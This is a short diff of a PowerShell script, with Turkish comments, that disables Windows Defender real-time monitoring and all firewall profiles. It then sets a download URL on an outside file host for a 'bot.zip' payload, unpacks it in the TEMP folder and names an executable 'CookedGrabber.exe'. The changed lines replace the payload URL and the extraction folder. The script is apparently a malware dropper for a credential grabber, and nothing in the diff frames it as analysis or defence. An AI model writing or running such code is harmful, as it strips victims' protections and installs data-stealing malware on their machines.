@@ -5,9 +5,9 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 # === AYARLAR ===
-$zipUrl = "https://phs8.krakencloud.net/force-download/YTVlZDUyNmFjMjM0ODljMEdJkIYYNXKlh90AQUmTDQePnkgZwCY0DknElozHjF3N/nhRWBTtepD"
+$zipUrl = "https://phs6.krakencloud.net/force-download/ZjdhMjJlNmIwMGM3YTQ0ZnUvbBzC6-Fq1H1QfOvKwtVYQ2m_AddficIHlUyr9JwO/t28HbdD6ca"
 $zipPath = "$env:TEMP\bot.zip"
-$extractPath = "$env:TEMP\cikartilan"
+$extractPath = "$env:TEMP\karımicin"
 $exeName = "CookedGrabber.exe"
 
 # TEMİZLİK
